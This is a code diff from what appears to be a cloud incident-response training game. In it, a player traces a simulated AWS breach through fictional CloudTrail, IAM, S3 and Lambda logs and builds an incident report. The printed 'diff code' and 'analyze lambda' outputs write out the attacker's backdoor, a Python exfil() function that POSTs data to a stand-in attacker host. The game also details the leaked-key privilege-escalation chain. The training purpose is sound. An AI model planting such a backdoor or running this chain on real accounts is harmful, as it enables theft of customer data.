+                    engine.printLine('  Repository: hexworth-corp/deploy-scripts (DELETED, cached by GitGuardian)', 'warning');
+                    engine.printLine('  File: .env.production (committed 02/28)', 'warning');
+                    engine.printLine('  Discovered: 03/03 by threat intel feed', 'info');
+                    state.compromisedKeyFound = true;
+                    break;
+
+                case 'config-audit':
+                    engine.printLine('=== AWS CONFIG TIMELINE ===', 'heading');
+                    engine.printLine('Resource: hexworth-prod-data (S3 Bucket)', 'node-info');
+                    engine.printLine('[02/28] Config: PublicAccessBlock=ON, BucketPolicy=restrictive \u2713', 'success');
+                    engine.printLine('[03/03 01:22] Config CHANGE: BucketPolicy=public-read  \u2190 [NON-COMPLIANT]', 'error');
+                    engine.printLine('[03/03 01:22] Config CHANGE: PublicAccessBlock=OFF  \u2190 [NON-COMPLIANT]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('Resource: DataAccessPolicy (IAM)', 'node-info');
+                    engine.printLine('[02/28] Config: s3:PutObject on hexworth-deploy/* only \u2713', 'success');
+                    engine.printLine('[03/03 01:15] Config CHANGE: s3:*, lambda:*, iam:*  \u2190 [NON-COMPLIANT]', 'error');
+                    engine.printLine('', 'system');
+                    engine.printLine('2 resources NON-COMPLIANT', 'warning');
+                    break;
+
+                default:
+                    engine.printLine('No detailed information available for this service.', 'system');
             }
 
-            // Content
-            const iconEl = cell.querySelector('.cell-icon');
-            const labelEl = cell.querySelector('.cell-label');
-            const agentEl = cell.querySelector('.cell-agent');
-
-            if (type === 'wall') {
-                iconEl.textContent = '';
-                labelEl.textContent = '';
-            } else if (vis === 'hidden' && !isCurrent) {
-                iconEl.textContent = '?';
-                labelEl.textContent = '';
-            } else if (type === 'empty') {
-                iconEl.textContent = '\u00B7';
-                labelEl.textContent = '';
+            engine.printLine('', 'system');
+            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;
+            engine.printLine('Sources examined: ' + examined + ' / 8', 'info');
+            if (examined < 5) {
+                engine.printLine('Examine ' + (5 - examined) + ' more source(s) before building the report.', 'system');
             } else {
-                const info = CELL_INFO[type];
-                iconEl.textContent = info.abbr;
-                labelEl.textContent = (vis === 'visited' || isCurrent) ? info.label : '';
+                engine.printLine('Sufficient sources gathered. Use "report" to build the incident report.', 'info');
             }
 
-            agentEl.style.display = isCurrent ? 'block' : 'none';
+            engine.checkObjectives();
+            engine.saveState();
         }
-    }
-}
 
-// ═══ Fog of War ═══
-
-function revealAdjacent(col, row) {
-    const dirs = [[0,-1],[0,1],[1,0],[-1,0]];
-    dirs.forEach(function(d) {
-        const nc = col + d[0];
-        const nr = row + d[1];
-        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) return;
-        if (GRID_MAP[nr][nc] === 'wall') return;
-        const key = nc + ',' + nr;
-        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
-            STATE.visibility[key] = 'revealed';
-            const cell = document.querySelector(`.grid-cell[data-col="${nc}"][data-row="${nr}"]`);
-            if (cell) {
-                cell.classList.add('just-revealed');
-                setTimeout(function() { cell.classList.remove('just-revealed'); }, 500);
+        function cmdQuery(args) {
+            var state = engine.getState();
+            if (!args.length) { engine.printLine('Usage: query <filter>', 'error'); engine.printLine('Examples: query AKIAEXAMPLE123, query 91.234, query s3', 'system'); return; }
+            if (getCell() !== 'cloudtrail' && (!state.sourcesExamined || !state.sourcesExamined.has('cloudtrail'))) {
+                engine.printLine('query: requires access to CLOUDTRAIL.', 'error');
+                engine.printLine('Navigate to CLOUDTRAIL and examine it first.', 'system');
+                return;
             }
-        }
-    });
-}
 
-// ═══ Terminal Output ═══
+            var filter = args.join(' ').toLowerCase();
+            engine.printLine('', 'system');
 
-function printLine(text, type) {
-    const output = document.getElementById('term-output');
-    const line = document.createElement('div');
-    line.className = 'term-line term-' + (type || 'system');
-    line.textContent = text;
-    output.appendChild(line);
-
-    // Cap at 200 lines to prevent memory bloat
-    while (output.children.length > 200) {
-        output.removeChild(output.firstChild);
-    }
-    output.scrollTop = output.scrollHeight;
-}
-
-// ═══ Node Resolution ═══
-
-function resolveNode(query) {
-    var q = query.toLowerCase();
-    var exact = [];
-    var partial = [];
-
-    for (var r = 0; r < ROWS; r++) {
-        for (var c = 0; c < COLS; c++) {
-            var type = GRID_MAP[r][c];
-            if (type === 'empty' || type === 'wall') continue;
-            var info = CELL_INFO[type];
-            var vis = STATE.visibility[c + ',' + r] || 'hidden';
-            var entry = { type: type, col: c, row: r, visibility: vis, info: info };
-
-            if (q === type || q === info.label.toLowerCase() || q === info.ip || q === info.abbr.toLowerCase()) {
-                exact.push(entry);
-            } else if (type.indexOf(q) !== -1 || info.label.toLowerCase().indexOf(q) !== -1) {
-                partial.push(entry);
+            if (filter.indexOf('akia') !== -1 || filter.indexOf('key') !== -1 || filter === 'akiaexample123') {
+                engine.printLine('=== CLOUDTRAIL QUERY: AKIAEXAMPLE123 ===', 'heading');
+                engine.printLine('[03/03 01:14] sts:GetCallerIdentity', 'node-info');
+                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy', 'node-info');
+                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion', 'node-info');
+                engine.printLine('[03/03 01:17] iam:AttachUserPolicy', 'node-info');
+                engine.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz', 'node-info');
+                engine.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
+                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
+                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
+                engine.printLine('[03/03 01:22] s3:PutPublicAccessBlock', 'node-info');
+                engine.printLine('', 'system');
+                engine.printLine('Total: 9 API calls by AKIAEXAMPLE123 in 8-minute window.', 'info');
+            } else if (filter.indexOf('91.234') !== -1 || filter.indexOf('tor') !== -1) {
+                engine.printLine('=== CLOUDTRAIL QUERY: 91.234.xx.xx ===', 'heading');
+                engine.printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 source: 91.234.xx.xx', 'node-info');
+                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
+                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
+                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 source: 91.234.xx.xx', 'node-info');
+                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 source: 91.234.xx.xx', 'node-info');
+                engine.printLine('', 'system');
+                engine.printLine('IP 91.234.xx.xx: known Tor exit node. All activity via this IP is attacker-controlled.', 'warning');
+            } else if (filter.indexOf('s3') !== -1) {
+                engine.printLine('=== CLOUDTRAIL QUERY: S3 OPERATIONS ===', 'heading');
+                engine.printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
+                engine.printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz (847MB)', 'error');
+                engine.printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 public-read enabled', 'error');
+                engine.printLine('[03/03 01:22] s3:PutPublicAccessBlock \u2014 block disabled', 'error');
+            } else if (filter.indexOf('iam') !== -1 || filter.indexOf('policy') !== -1) {
+                engine.printLine('=== CLOUDTRAIL QUERY: IAM OPERATIONS ===', 'heading');
+                engine.printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy v2', 'error');
+                engine.printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 set to v2', 'error');
+                engine.printLine('[03/03 01:17] iam:AttachUserPolicy \u2014 added admin-policy to svc-deploy', 'error');
+            } else if (filter.indexOf('lambda') !== -1) {
+                engine.printLine('=== CLOUDTRAIL QUERY: LAMBDA OPERATIONS ===', 'heading');
+                engine.printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'error');
+                engine.printLine('[03/03 01:20] lambda:UpdateFunctionConfiguration', 'warning');
+                engine.printLine('Source: 91.234.xx.xx (Tor exit node)', 'error');
+            } else {
+                engine.printLine('No matching events for filter: "' + args.join(' ') + '".', 'system');
+                engine.printLine('Try: query AKIAEXAMPLE123, query 91.234, query s3, query iam, query lambda', 'info');
             }
+            engine.printLine('', 'system');
         }
-    }
 
-    var results = exact.length > 0 ? exact : partial;
+        function cmdDiff(args) {
+            var state = engine.getState();
+            if (!args.length) { engine.printLine('Usage: diff <resource>', 'error'); engine.printLine('Resources: policy, code, s3, iam', 'system'); return; }
+            var resource = args.join(' ').toLowerCase();
+            engine.printLine('', 'system');
 
-    if (results.length === 1) return results[0];
-    if (results.length > 1) {
-        printLine('Multiple matches. Be more specific:', 'warning');
-        results.forEach(function(m) {
-            printLine('  ' + m.info.label + ' (' + m.info.ip + ')', 'info');
+            if (resource.indexOf('policy') !== -1 || resource.indexOf('iam') !== -1) {
+                if (getCell() !== 'iam-console' && (!state.sourcesExamined || !state.sourcesExamined.has('iam-console'))) {
+                    engine.printLine('diff: examine IAM-CONSOLE first.', 'error'); return;
+                }
+                engine.printLine('=== IAM POLICY DIFF: DataAccessPolicy ===', 'heading');
+                engine.printLine('v1 (2025-06-15):', 'node-info');
+                engine.printLine('  Effect: Allow', 'info');
+                engine.printLine('  Action: ["s3:PutObject"]', 'info');
+                engine.printLine('  Resource: "arn:aws:s3:::hexworth-deploy/*"', 'info');
+                engine.printLine('', 'system');
+                engine.printLine('v2 (2026-03-03 01:15) [CURRENT]:', 'node-info');
+                engine.printLine('  Effect: Allow', 'info');
+                engine.printLine('+ Action: ["s3:*", "lambda:*", "iam:*"]  \u2190 ADDED', 'error');
+                engine.printLine('+ Resource: "*"  \u2190 WIDENED TO ALL RESOURCES', 'error');
+                engine.printLine('', 'system');
+                engine.printLine('Change summary: 7 additional permission categories granted.', 'warning');
+                if (!state.sourcesExamined) state.sourcesExamined = new Set();
+                state.sourcesExamined.add('iam-console');
+                state.iamEscalationTraced = true;
+            } else if (resource.indexOf('code') !== -1 || resource.indexOf('lambda') !== -1) {
+                if (getCell() !== 'lambda-func' && (!state.sourcesExamined || !state.sourcesExamined.has('lambda-func'))) {
+                    engine.printLine('diff: examine LAMBDA first.', 'error'); return;
+                }
+                engine.printLine('=== LAMBDA CODE DIFF: data-processor ===', 'heading');
+                engine.printLine('Modified: 03/03 01:20 by AKIAEXAMPLE123', 'warning');
+                engine.printLine('', 'system');
+                engine.printLine('  import boto3', 'info');
+                engine.printLine('  import json', 'info');
+                engine.printLine('+ import urllib.request', 'error');
+                engine.printLine('', 'system');
+                engine.printLine('  def handler(event, context):', 'info');
+                engine.printLine('      data = process(event)', 'info');
+                engine.printLine('+     exfil(data)', 'error');
+                engine.printLine('      return data', 'info');
+                engine.printLine('', 'system');
+                engine.printLine('+ def exfil(data):', 'error');
+                engine.printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
+                engine.printLine("+         data=json.dumps(data).encode())", 'error');
+                engine.printLine('', 'system');
+                engine.printLine('3 lines added. Backdoor function introduced.', 'warning');
+                if (!state.sourcesExamined) state.sourcesExamined = new Set();
+                state.sourcesExamined.add('lambda-func');
+            } else if (resource.indexOf('s3') !== -1 || resource.indexOf('bucket') !== -1) {
+                if (getCell() !== 'config-audit' && (!state.sourcesExamined || !state.sourcesExamined.has('config-audit'))) {
+                    engine.printLine('diff: examine CONFIG-AUDIT first.', 'error'); return;
+                }
+                engine.printLine('=== S3 BUCKET POLICY DIFF: hexworth-prod-data ===', 'heading');
+                engine.printLine('Before (02/28):', 'node-info');
+                engine.printLine('  PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'success');
+                engine.printLine('  BucketPolicy: { Effect: Deny, Principal: *, NotAction: [...internal] }', 'success');
+                engine.printLine('', 'system');
+                engine.printLine('After (03/03 01:22):', 'node-info');
+                engine.printLine('- PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'error');
+                engine.printLine('+ PublicAccessBlock: { BlockPublicAcls: false, BlockPublicPolicy: false }', 'error');
+                engine.printLine('- BucketPolicy: { Effect: Deny, ... }', 'error');
+                engine.printLine('+ BucketPolicy: { Effect: Allow, Principal: "*", Action: "s3:GetObject" }', 'error');
+                engine.printLine('', 'system');
+                engine.printLine('Bucket changed from private to fully public in 1 minute.', 'warning');
+                if (!state.sourcesExamined) state.sourcesExamined = new Set();
+                state.sourcesExamined.add('config-audit');
+            } else {
+                engine.printLine('diff: unknown resource "' + args.join(' ') + '".', 'error');
+                engine.printLine('Try: diff policy, diff code, diff s3', 'system');
+            }
+
+            engine.printLine('', 'system');
+            engine.checkObjectives();
+            engine.saveState();
+        }
+
+        function cmdDownload() {
+            var state = engine.getState();
+            if (getCell() !== 's3-bucket') { engine.printLine('download: must be at S3-BUCKET node.', 'error'); return; }
+
+            engine.printLine('', 'system');
+            engine.printLine('Downloading access logs from hexworth-prod-data...', 'system');
+            engine.printLine('', 'system');
+            engine.printLine('=== S3 ACCESS LOG: hexworth-prod-data ===', 'heading');
+            engine.printLine('2026-03-03T01:18:01Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
+            engine.printLine('  Requester IP: 91.234.xx.xx  Bytes: 888,279,040  Status: 200', 'warning');
+            engine.printLine('2026-03-03T01:18:47Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
+            engine.printLine('  Requester IP: 91.234.xx.xx  Bytes: 0  Status: 206 (partial)', 'warning');
+            engine.printLine('2026-03-03T01:22:10Z AKIAEXAMPLE123 REST.PUT.BUCKETPOLICY', 'node-info');
+            engine.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
+            engine.printLine('2026-03-03T01:22:11Z AKIAEXAMPLE123 REST.PUT.PUBLIC_ACCESS_BLOCK', 'node-info');
+            engine.printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
+            engine.printLine('2026-03-03T01:23:44Z anonymous REST.GET.OBJECT customers/export.csv.gz', 'node-info');
+            engine.printLine('  Requester IP: 45.11.yy.yy  Bytes: 888,279,040  Status: 200  \u2190 [PUBLIC ACCESS!]', 'error');
+            engine.printLine('', 'system');
+            engine.printLine('Public access confirmed: data downloaded by a second IP after bucket policy change.', 'error');
+
+            if (!state.sourcesExamined) state.sourcesExamined = new Set();
+            state.sourcesExamined.add('s3-bucket');
+            state.exfilDataDetermined = true;
+
+            engine.printLine('', 'system');
+            engine.checkObjectives();
+            engine.saveState();
+        }
+
+        function cmdAnalyze(args) {
+            var state = engine.getState();
+            if (!args.length) { engine.printLine('Usage: analyze <resource>', 'error'); engine.printLine('Resources: lambda, guardduty, vpc, cloudtrail', 'system'); return; }
+            var resource = args.join(' ').toLowerCase();
+            engine.printLine('', 'system');
+
+            if (resource.indexOf('lambda') !== -1 || resource.indexOf('code') !== -1) {
+                if (!state.sourcesExamined || !state.sourcesExamined.has('lambda-func')) { engine.printLine('analyze: examine LAMBDA first.', 'error'); return; }
+                engine.printLine('=== LAMBDA ANALYSIS: data-processor ===', 'heading');
+                engine.printLine('Full backdoor code reconstructed:', 'node-info');
+                engine.printLine('', 'system');
+                engine.printLine("import urllib.request, json", 'error');
+                engine.printLine("", 'system');
+                engine.printLine("def exfil(data):", 'error');
+                engine.printLine("    req = urllib.request.Request(", 'error');
+                engine.printLine("        'https://91.234.xx.xx/collect',", 'error');
+                engine.printLine("        data=json.dumps(data).encode(),", 'error');
+                engine.printLine("        method='POST'", 'error');
+                engine.printLine("    )", 'error');
+                engine.printLine("    urllib.request.urlopen(req, timeout=10)", 'error');
+                engine.printLine('', 'system');
+                engine.printLine('Backdoor fires on every Lambda invocation. Trigger: S3:PutObject.', 'warning');
+                engine.printLine('Every file written to hexworth-prod-data is silently forwarded to attacker.', 'error');
+                engine.printLine('MITRE ATT&CK: T1567.002 \u2014 Exfiltration to Cloud Storage', 'info');
+            } else if (resource.indexOf('guardduty') !== -1 || resource.indexOf('gdd') !== -1) {
+                if (!state.sourcesExamined || !state.sourcesExamined.has('guardduty')) { engine.printLine('analyze: examine GUARDDUTY first.', 'error'); return; }
+                engine.printLine('=== GUARDDUTY FINDING DETAIL ===', 'heading');
+                engine.printLine('Finding: Exfiltration:S3/MaliciousIPCaller (Severity 9.0)', 'error');
+                engine.printLine('MITRE ATT&CK: T1530 \u2014 Data from Cloud Storage', 'info');
+                engine.printLine('  Attacker used AKIAEXAMPLE123 to access hexworth-prod-data', 'warning');
+                engine.printLine('  Source IP 91.234.xx.xx is in GuardDuty threat intel feed (Tor)', 'warning');
+                engine.printLine('', 'system');
+                engine.printLine('Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration (8.5)', 'error');
+                engine.printLine('MITRE ATT&CK: T1078.004 \u2014 Valid Accounts: Cloud Accounts', 'info');
+                engine.printLine('  Credential AKIAEXAMPLE123 used from anomalous Tor IP', 'warning');
+                engine.printLine('', 'system');
+                engine.printLine('Full attack chain: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
+            } else if (resource.indexOf('vpc') !== -1 || resource.indexOf('flow') !== -1) {
+                if (!state.sourcesExamined || !state.sourcesExamined.has('vpc-flowlogs')) { engine.printLine('analyze: examine VPC-FLOWLOGS first.', 'error'); return; }
+                engine.printLine('=== VPC TRAFFIC VOLUME ANALYSIS ===', 'heading');
+                engine.printLine('Inbound from 91.234.xx.xx:', 'node-info');
+                engine.printLine('  01:14-01:22  12 API connections  ~8KB total  (control traffic)', 'info');
+                engine.printLine('Outbound to 91.234.xx.xx:', 'node-info');
+                engine.printLine('  01:18  888MB  (S3 exfiltration \u2014 HTTPS GET)', 'error');
+                engine.printLine('  01:25  ~2MB   (Lambda exfil callback \u2014 HTTPS POST)', 'error');
+                engine.printLine('', 'system');
+                engine.printLine('Total exfiltrated: ~890MB over 11-minute window.', 'error');
+                engine.printLine('90MB/min sustained outbound \u2014 well above normal baseline of <1MB/min.', 'warning');
+            } else if (resource.indexOf('cloudtrail') !== -1 || resource.indexOf('trail') !== -1) {
+                if (!state.sourcesExamined || !state.sourcesExamined.has('cloudtrail')) { engine.printLine('analyze: examine CLOUDTRAIL first.', 'error'); return; }
+                engine.printLine('=== CLOUDTRAIL DEEP ANALYSIS ===', 'heading');
+                engine.printLine('Total events in incident window (01:14-01:25):', 'node-info');
+                engine.printLine('  IAM operations: 3 (all privilege escalation)', 'error');
+                engine.printLine('  S3 operations:  4 (exfil + bucket policy tampering)', 'error');
+                engine.printLine('  Lambda ops:     2 (code update + config change)', 'error');
+                engine.printLine('  STS ops:        1 (identity verification)', 'info');
+                engine.printLine('', 'system');
+                engine.printLine('CloudTrail was NOT disabled. Attacker left a complete evidence trail.', 'success');
+                engine.printLine('CloudTrail integrity validation: PASSED (log file hashes verified)', 'success');
+            } else {
+                engine.printLine('analyze: unknown resource "' + args.join(' ') + '".', 'error');
+                engine.printLine('Try: analyze lambda, analyze guardduty, analyze vpc, analyze cloudtrail', 'system');
+            }
+            engine.printLine('', 'system');
+        }
+
+        function cmdReport() {
+            var state = engine.getState();
+            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;
+            var missing = [];
+            if (examined < 5) { missing.push('examine at least ' + (5 - examined) + ' more source(s)'); }
+            if (!state.compromisedKeyFound) { missing.push('find the compromised key (examine SECRETS-MGR)'); }
+            if (!state.iamEscalationTraced) { missing.push('trace IAM escalation (examine IAM-CONSOLE)'); }
+            if (!state.exfilDataDetermined) { missing.push('determine exfil data (examine S3-BUCKET)'); }
+
+            if (missing.length > 0) {
+                engine.printLine('Cannot build report yet. Still needed:', 'warning');
+                missing.forEach(function(m) { engine.printLine('  \u2014 ' + m, 'error'); });
+                engine.printLine('', 'system');
+                engine.printLine('Sources examined: ' + examined + '/8', 'info');
+                return;
+            }
+
+            engine.printLine('', 'system');
+            engine.printLine('=== INCIDENT REPORT: CLOUD-2026-0305 ===', 'heading');
+            engine.printLine('', 'system');
+            engine.printLine('SUMMARY: Cloud infrastructure breach via compromised API key', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('TIMELINE:', 'heading');
+            engine.printLine('[02/28] API key (AKIAEXAMPLE123) committed to public GitHub repo', 'warning');
+            engine.printLine('[03/03 01:14] Attacker authenticates from Tor (91.234.xx.xx)', 'error');
+            engine.printLine('[03/03 01:15] IAM privilege escalation \u2014 s3:*, lambda:*, iam:*', 'error');
+            engine.printLine('[03/03 01:18] S3 exfiltration \u2014 847MB customer data (2.3M records)', 'error');
+            engine.printLine('[03/03 01:20] Lambda backdoor installed for persistent access', 'error');
+            engine.printLine('[03/03 01:22] S3 bucket policy changed to public read', 'error');
+            engine.printLine('', 'system');
+            engine.printLine('IMPACT:', 'heading');
+            engine.printLine('  \u2014 2.3M customer records exposed (PII: names, emails, SSN)', 'error');
+            engine.printLine('  \u2014 Lambda function compromised for ongoing exfiltration', 'error');
+            engine.printLine('  \u2014 S3 bucket exposed to public internet', 'error');
+            engine.printLine('', 'system');
+            engine.printLine('ROOT CAUSE: Unrotated API key exposed in public repository', 'warning');
+            engine.printLine('', 'system');
+            engine.printLine('MITRE ATT&CK: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
+            engine.printLine('', 'system');
+            engine.printLine('INCIDENT REPORT COMPLETE.', 'success');
+
+            state.reportBuilt = true;
+            engine.printLine('', 'system');
+            engine.checkObjectives();
+            engine.updateGrid();
+            engine.saveState();
+        }
+
+        function cmdStatus() {
+            var state = engine.getState();
+            var cellType = getCell();
+            var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? config.nodes[cellType].label : 'No service';
+            var examined = state.sourcesExamined ? state.sourcesExamined.size : 0;
+
+            engine.printLine('', 'system');
+            engine.printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
+            engine.printLine('Position: (' + state.position.col + ',' + state.position.row + ') \u2014 ' + posLabel, 'info');
+            engine.printLine('Services discovered: ' + state.nodesDiscovered.size + ' / 8', 'info');
+            engine.printLine('Sources examined: ' + examined + ' / 8', 'info');
+            engine.printLine('Commands used: ' + state.agentCmdCount, 'info');
+            engine.printLine('', 'system');
+            engine.printLine('Compromised key found:   ' + (state.compromisedKeyFound ? 'YES \u2014 AKIAEXAMPLE123' : 'NO'), state.compromisedKeyFound ? 'success' : 'warning');
+            engine.printLine('IAM escalation traced:   ' + (state.iamEscalationTraced ? 'YES' : 'NO'), state.iamEscalationTraced ? 'success' : 'warning');
+            engine.printLine('Exfil data determined:   ' + (state.exfilDataDetermined ? 'YES \u2014 2.3M records, 847MB' : 'NO'), state.exfilDataDetermined ? 'success' : 'warning');
+            engine.printLine('Incident report built:   ' + (state.reportBuilt ? 'YES' : 'NO'), state.reportBuilt ? 'success' : 'warning');
+            engine.printLine('', 'system');
+            engine.printLine('Sources examined:', 'heading');
+            var allSources = ['cloudtrail', 'iam-console', 's3-bucket', 'lambda-func', 'vpc-flowlogs', 'guardduty', 'secrets-manager', 'config-audit'];
+            allSources.forEach(function(src) {
+                var done = state.sourcesExamined && state.sourcesExamined.has(src);
+                var info = config.nodes[src];
+                engine.printLine((done ? ' [X] ' : ' [ ] ') + info.label, done ? 'success' : 'system');
+            });
+
+            engine.printLine('', 'system');
+            engine.printLine('Objectives:', 'heading');
+            var objText = [
+                'Find compromised key (examine SECRETS-MGR)',
+                'Trace IAM escalation (examine IAM-CONSOLE)',
+                'Determine exfil data (examine S3-BUCKET)',
+                'Build incident report ("report" with 5+ sources)'
+            ];
+            state.objectives.forEach(function(done, i) {
+                engine.printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
+            });
+        }
+
+        // ---- Terminal command dispatch ----
+        engine.terminal.onCommand(function(cmd) {
+            var state = engine.getState();
+            state.agentCmdCount++;
+            var parts = cmd.trim().split(/\s+/);
+            var action = parts[0].toLowerCase();
+            var args = parts.slice(1);
+
+            switch (action) {
+                case 'scan':     cmdScan(); break;
+                case 'move':     cmdMove(args); break;
+                case 'examine':  cmdExamine(); break;
+                case 'query':    cmdQuery(args); break;
+                case 'diff':     cmdDiff(args); break;
+                case 'download': cmdDownload(); break;
+                case 'analyze':  cmdAnalyze(args); break;
+                case 'report':   cmdReport(); break;
+                case 'status':   cmdStatus(); break;
+                case 'help':     cmdHelp(); break;
+                case 'clear':    engine.terminal.clearOutput(); break;
+                default:
+                    engine.printLine('Unknown command: ' + action, 'error');
+                    engine.printLine('Type "help" for available commands.', 'system');
+            }
         });
-        return null;
-    }
-    return null;
-}
-
-// ─── Helper: get current cell type ───
-function currentCellType() {
-    return GRID_MAP[STATE.position.row][STATE.position.col];
-}
-
-// ═══ Command Handlers ═══
-
-function cmdHelp() {
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
-    printLine('  scan              Survey area, reveal adjacent services', 'info');
-    printLine('  move <dir>        Move agent (north/south/east/west or n/s/e/w)', 'info');
-    printLine('  examine           Investigate current service in depth', 'info');
-    printLine('  query <filter>    Filter CloudTrail events (key, IP, or service)', 'info');
-    printLine('  diff <resource>   Compare resource versions (policy, code, s3, iam)', 'info');
-    printLine('  download          Download access logs (at S3-BUCKET)', 'info');
-    printLine('  analyze <res>     Deep-dive analysis of a resource', 'info');
-    printLine('  report            Build incident report (requires 5+ sources)', 'info');
-    printLine('  status            Show sources examined and objectives', 'info');
-    printLine('  help              Show this reference', 'info');
-    printLine('  clear             Clear terminal output', 'info');
-    printLine('', 'system');
-    printLine('Start: examine CLOUDTRAIL to see the initial event log.', 'system');
-    printLine('Then explore IAM, S3, LAMBDA, SECRETS-MGR, GUARDDUTY.', 'system');
-    printLine('Build the report once you have 5+ sources examined.', 'system');
-}
-
-function cmdScan() {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-
-    printLine('Scanning area...', 'system');
-    printLine('', 'system');
-
-    if (cellType !== 'empty' && cellType !== 'wall') {
-        var cur = CELL_INFO[cellType];
-        printLine('Current: ' + cur.label + ' (' + cur.ip + ')', 'heading');
-        printLine(cur.desc, 'info');
-    } else {
-        printLine('Current: No service at this location', 'heading');
-    }
-
-    printLine('', 'system');
-    printLine('Adjacent:', 'heading');
-
-    var dirs = [
-        { name: 'North', dc: 0, dr: -1 },
-        { name: 'South', dc: 0, dr: 1 },
-        { name: 'East',  dc: 1, dr: 0 },
-        { name: 'West',  dc: -1, dr: 0 }
-    ];
-
-    dirs.forEach(function(d) {
-        var nc = col + d.dc;
-        var nr = row + d.dr;
-        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) {
-            printLine('  ' + d.name + ': [network edge]', 'system');
-            return;
-        }
-        var type = GRID_MAP[nr][nc];
-        if (type === 'wall') {
-            printLine('  ' + d.name + ': [blocked]', 'system');
-            return;
-        }
-        var key = nc + ',' + nr;
-        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
-            STATE.visibility[key] = 'revealed';
-        }
-        if (type === 'empty') {
-            printLine('  ' + d.name + ': No service', 'info');
-        } else {
-            var info = CELL_INFO[type];
-            printLine('  ' + d.name + ': ' + info.label + ' (' + info.ip + ')', 'node-info');
-        }
-    });
-
-    updateGrid();
-    saveState();
-}
-
-function cmdMove(args) {
-    if (!args.length) {
-        printLine('Usage: move <direction>', 'error');
-        printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
-        return;
-    }
-
-    var dirMap = {
-        'north': [0,-1], 'n': [0,-1],
-        'south': [0,1],  's': [0,1],
-        'east':  [1,0],  'e': [1,0],
-        'west':  [-1,0], 'w': [-1,0]
-    };
-
-    var dir = args[0].toLowerCase();
-    if (!dirMap[dir]) {
-        printLine('Unknown direction: ' + args[0], 'error');
-        printLine('Use: north/south/east/west (or n/s/e/w)', 'system');
-        return;
-    }
-
-    var d = dirMap[dir];
-    var newCol = STATE.position.col + d[0];
-    var newRow = STATE.position.row + d[1];
-
-    // Bounds check
-    if (newCol < 0 || newCol >= COLS || newRow < 0 || newRow >= ROWS) {
-        printLine('Edge of cloud region. Cannot move ' + dir + '.', 'error');
-        return;
-    }
-
-    var cellType = GRID_MAP[newRow][newCol];
-
-    if (cellType === 'wall') {
-        printLine('Blocked. No path ' + dir + ' from here.', 'error');
-        return;
-    }
-
-    // Move investigator
-    STATE.position = { col: newCol, row: newRow };
-    STATE.visibility[newCol + ',' + newRow] = 'visited';
-
-    if (cellType !== 'empty') {
-        STATE.nodesDiscovered.add(cellType);
-    }
-
-    revealAdjacent(newCol, newRow);
-
-    var dirFull = { n:'north', s:'south', e:'east', w:'west' };
-    var dirName = dirFull[dir] || dir;
-    if (cellType === 'empty') {
-        printLine('Moving ' + dirName + '... No service here.', 'system');
-    } else {
-        var info = CELL_INFO[cellType];
-        printLine('Moving ' + dirName + '... ' + info.label + ' (' + info.ip + ')', 'success');
-        printLine(info.desc, 'info');
-    }
-
-    checkObjectives();
-    updateGrid();
-    saveState();
-}
-
-function cmdExamine() {
-    var type = currentCellType();
-
-    if (type === 'empty') {
-        printLine('No AWS service at this location. Move to a service node.', 'system');
-        return;
-    }
-    if (type === 'wall') {
-        printLine('Cannot examine this location.', 'error');
-        return;
-    }
-
-    printLine('', 'system');
-    STATE.sourcesExamined.add(type);
-
-    switch (type) {
-        case 'cloudtrail':
-            printLine('=== CLOUDTRAIL EVENTS ===', 'heading');
-            printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 AKIAEXAMPLE123 (us-east-1)', 'node-info');
-            printLine('  Source IP: 91.234.xx.xx (Tor exit node)  \u2190 [SUSPICIOUS]', 'warning');
-            printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 AKIAEXAMPLE123', 'node-info');
